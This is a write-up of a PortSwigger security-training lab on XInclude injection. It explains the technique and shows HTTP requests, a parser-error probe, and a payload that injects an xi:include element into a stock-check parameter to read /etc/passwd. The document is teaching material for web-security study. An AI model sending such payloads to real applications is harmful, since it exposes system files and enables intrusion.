# Exploiting XInclude to retrieve files

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

## Definition
Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For example:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Notes
This lab has a `Check stock` feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
To solve the lab, inject an XInclude statement to retrieve the contents of the `/etc/passwd` file.

**Original Request**
```http
POST /product/stock HTTP/1.1
Host: ac0e1f361e0dc719c08440640053009d.web-security-academy.net
...

productId=4&storeId=1
```

**Checking if uses SOAP or XML in Server-Side**
```http
POST /product/stock HTTP/1.1
Host: ac0e1f361e0dc719c08440640053009d.web-security-academy.net
...

productId=<&storeId=1
```

**Server Response**
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 120

"XML parser exited with non-zero code 1: The content of elements must consist of well-formed character data or markup.
"
```

**Malicious Payload**
```http
POST /product/stock HTTP/1.1
Host: ac0e1f361e0dc719c08440640053009d.web-security-academy.net
...

productId=<foo+xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include+parse="text"+href="file:///etc/passwd"/></foo>&storeId=1
```

## Key Words
> xml, xxe, xinclude